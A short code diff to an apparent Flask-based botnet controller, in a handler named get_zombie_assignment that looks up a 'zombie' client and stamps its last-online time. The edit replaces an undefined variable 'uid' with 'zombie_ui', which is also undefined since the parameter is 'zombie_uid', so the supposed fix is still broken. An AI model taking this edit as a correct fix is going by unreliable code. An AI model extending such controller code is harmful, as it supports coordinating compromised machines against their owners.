@@ -252,7 +252,7 @@ def task_toggle_active(uid):
 
 @app.route('/<zombie_uid>', methods=['GET'])
 def get_zombie_assignment(zombie_uid):
-    client = Client.query.filter_by(id=uid).first()
+    client = Client.query.filter_by(id=zombie_ui).first()
     if client:
         ts = time.time()
         last_online = datetime.datetime.fromtimestamp(ts).strftime('%m/%d/%Y %I:%M:%S %p')
